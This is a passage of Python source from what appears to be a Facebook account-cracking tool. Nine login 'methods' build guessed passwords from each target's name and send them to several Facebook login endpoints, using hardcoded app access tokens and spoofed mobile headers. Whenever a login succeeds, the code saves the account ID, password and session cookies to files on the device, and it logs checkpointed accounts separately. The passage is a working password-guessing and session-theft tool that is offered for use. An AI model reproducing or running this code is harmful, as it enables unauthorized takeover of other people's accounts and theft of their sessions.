                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": generate_wv_ua(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        open('/sdcard/GEN-FILE-M1-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M2 GRAPH >>-------------#
def ___M_T_H_D_2___(ids,names,passlist):
        try:
                global loop,oks,cps
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {'User-Agent': generate_wv_ua(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        open('/sdcard/GEN-FILE-M2-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M3 B-GRAPH (mini) >>-------------#
def ___M_T_H_D_3___(ids,names,passlist):
        try:
                global loop,oks,cps
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"email": ids,"password": pas,"generate_analytics_claims": "1","credentials_type": "password","source": "login","error_detail_type": "button_with_disabled","enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate",}
                        headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","User-Agent": generate_wv_ua(),"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","X-FB-Friendly-Name": "authenticate","X-FB-Connection-Type": "unknown","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        open('/sdcard/GEN-FILE-M3-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M4 GRAPH (mini) >>-------------#
def ___M_T_H_D_4___(ids,names,passlist):
        try:
                global loop,oks,cps
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662","sdk_version": {random.randint(1,26)}, "email": ids,"password": pas,"sdk": "android","locale": "en_US","generate_session_cookies": "1","sig": "c1e620fa708a1d5696fb991c1bde5662"}
                        headers = {"Host": "graph.facebook.com","x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","user-agent":generate_wv_ua(),"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        open('/sdcard/GEN-FILE-M4-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M5 HOST >>-------------#
def ___M_T_H_D_5___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Ahmed'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            ua = generate_wv_ua()
            __u_r_l__ = session.get(f'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
            data = {"m_ts": re.search(r'name="m_ts" value="(.*?)"', str(__u_r_l__)).group(1),
            "li": re.search(r'name="li" value="(.*?)"', str(__u_r_l__)).group(1),
            "try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": re.search(r'name="jazoest" value="(\d+)"', str(__u_r_l__)).group(1),"lsd": re.search(r'name="lsd" value="(.*?)"', str(__u_r_l__)).group(1)}
            headers = {"Host": "touch.facebook.com",
            "content-length": str(len((data))),
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)', str(ua)).group(1),re.search(r'Chrome/(\d+)', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search(r'name="lsd" value="(.*?)"', str(__u_r_l__)).group(1),"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            respons = session.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False)
            ___f_u_c_k___ = session.cookies.get_dict().keys()
            if "c_user" in ___f_u_c_k___:
                coki=session.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+kuki);print('')
                open('/sdcard/GEN-FILE-M5-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in ___f_u_c_k___:
                uid = re.findall('c_user=(.*);xs', str(session.cookies.get_dict()))[0] if 'c_user' in session.cookies.get_dict() else ids
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1

#------------->> FILE METHOD M6 >>-------------#
def ___M_T_H_D_6___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Use Nigerian user agent
        ua = generate_wv_ua()
        
        datax = {
            'adid': str(uuid.uuid4()), 
            'format': 'json', 
            'device_id': str(uuid.uuid4()), 
            'email': ids, 
            'password': pas, 
            'generate_analytics_claims': '1', 
            'community_id': '', 
            'cpl': 'true', 
            'try_num': '1', 
            'family_device_id': str(uuid.uuid4()), 
            'credentials_type': 'password', 
            'source': 'login', 
            'error_detail_type': 'button_with_disabled', 
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        header = {
            'User-Agent': ua, 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 50000000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': random.choice(['WIFI', 'CELLULAR', 'MOBILE.4G']), 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True'
        }
        
        try:
            lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False, timeout=30).json()
            
            if 'session_key' in lo:
                cki = lo['session_cookies']
                ck = {}
                for xk in cki:
                    ck.update({xk['name']: xk['value']})
                coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
                uid = lo['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-FILE-M6-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in lo['error']['message']:
                uid = lo['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
                
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.Timeout:
            continue
        except json.JSONDecodeError:
            continue
        except Exception as e:
            continue
            
    loop += 1

#------------->> FILE METHOD M7 ADS MANAGER >>-------------#
def ___M_T_H_D_7___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    session = requests.Session()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
            
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            
            # Generate Nigerian user agent for Ads Manager
            ua = generate_nigerian_ua()
            
            # Ads Manager specific headers
            headers = {
                'User-Agent': ua,
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://adsmanager.facebook.com',
                'Referer': 'https://adsmanager.facebook.com/',
                'Connection': 'keep-alive',
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }
            
            # Ads Manager login data
            data = {
                'email': ids,
                'password': pas,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'format': 'json',
                'sdk_version': '2',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.adsmanager.protocol.AuthHandler',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'credentials_type': 'password',
                'source': 'ads_manager_login',
                'error_detail_type': 'button_with_disabled',
                'machine_id': str(uuid.uuid4()),
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4())
            }
            
            try:
                # Try Ads Manager endpoint first
                response = session.post(
                    'https://graph.facebook.com/auth/login',
                    data=data,
                    headers=headers,
                    timeout=30
                ).json()
                
                if 'session_key' in response:
                    coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    uid = response['uid']
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "GEN,  Ok,  id"')
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                    open('/sdcard/GEN-FILE-M7-ADS-MANAGER-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                    oks.append(ids)
                    break
                    
                elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                    uid = response['error']['error_data']['uid']
                    if 'y' in pcp:
                        year = tutulx(str(uid))
                        print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                        os.system('espeak -a 300 "Cp"')
                    open('/sdcard/GEN-FILE-M7-ADS-MANAGER-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                    
            except Exception as e:
                # Fallback to regular graph API
                try:
                    fallback_data = {
                        'adid': str(uuid.uuid4()),
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'email': ids,
                        'password': pas,
                        'generate_analytics_claims': '1',
                        'credentials_type': 'password',
                        'source': 'login',
                        'error_detail_type': 'button_with_disabled',
                        'enroll_misauth': 'false',
                        'generate_session_cookies': '1',
                        'generate_machine_id': '1',
                        'fb_api_req_friendly_name': 'authenticate',
                        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                    }
                    
                    fallback_headers = {
                        'User-Agent': ua,
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-Connection-Type': 'MOBILE.LTE'
                    }
                    
                    fallback_response = session.post(
                        'https://b-graph.facebook.com/auth/login',
                        data=fallback_data,
                        headers=fallback_headers,
                        timeout=30
                    ).json()
                    
                    if 'session_key' in fallback_response:
                        coki = ";".join(i["name"]+"="+i["value"] for i in fallback_response["session_cookies"])
                        uid = fallback_response['uid']
                        year = tutulx(str(uid))
                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                        print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                        open('/sdcard/GEN-FILE-M7-ADS-MANAGER-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                        oks.append(ids)
                        break
                        
                except:
                    continue
                    
    except Exception as e:
        pass
        
    loop += 1

#------------->> FILE METHOD M8 KATANA FACEBOOK >>-------------#
def ___M_T_H_D_8___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Katana-specific user agent
        ua = generate_wv_ua()
        
        # Katana Facebook login data
        data = {
            'jazoest': '2580',
            'lsd': 'AVrSdvFQZv4',
            'display': '',
            'enable_profile_selector': '',
            'legacy_return': '1',
            'next': '',
            'profile_selector_ids': '',
            'trynum': '1',
            'timezone': '-480',
            'lgndim': '',
            'lgnrnd': '',
            'lgnjs': '',
            'email': ids,
            'pass': pas,
            'login': 'Log In',
            'persistent': '1',
            'default_persistent': '0'
        }
        
        headers = {
            'Host': 'm.facebook.com',
            'content-length': str(len(data)),
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)', str(ua)).group(1),re.search(r'Chrome/(\d+)', str(ua)).group(1)),
            'sec-ch-ua-mobile': '?1',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'x-requested-with': 'mark.via.gp',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://m.facebook.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://m.facebook.com/login/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9'
        }
        
        try:
            session = requests.Session()
            # First get the login page to obtain necessary tokens
            login_page = session.get('https://m.facebook.com/login/', headers=headers)
            
            # Extract lsd and jazoest from the login page
            lsd_match = re.search(r'name="lsd" value="(.*?)"', login_page.text)
            jazoest_match = re.search(r'name="jazoest" value="(\d+)"', login_page.text)
            
            if lsd_match and jazoest_match:
                data['lsd'] = lsd_match.group(1)
                data['jazoest'] = jazoest_match.group(1)
            
            # Perform login
            response = session.post('https://m.facebook.com/login/device-based/login/async/', 
                                  data=data, headers=headers, allow_redirects=True)
            
            # Check for successful login
            if 'c_user' in session.cookies.get_dict():
                coki = ";".join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])
                uid = session.cookies.get_dict().get('c_user')
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-FILE-M8-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in session.cookies.get_dict():
                uid = session.cookies.get_dict().get('checkpoint', '').split('3A')[1].split('%')[0] if '3A' in session.cookies.get_dict().get('checkpoint', '') else ids
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M8-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
                
        except requests.exceptions.ConnectionError:
            continue
        except Exception as e:
            continue
            
    loop += 1

#------------->> FILE METHOD M9 FACEBOOK LITE >>-------------#
def ___M_T_H_D_9___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Facebook Lite specific user agent
        ua = "Facebook Android 1.9.0 (Android 4.0.3; SM-G361H Build/IML74K)"
        
        data = {
            'email': ids,
            'pass': pas,
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'credentials_type': 'password',
            'format': 'JSON',
            'generate_session_cookies': '1',
            'generate_analytics_claim': '1',
            'method': 'auth.login',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_lite_version': '1.9.0',
            'device_id': str(uuid.uuid4()),
            'family_device_id': str(uuid.uuid4())
        }
        
        headers = {
            'User-Agent': ua,
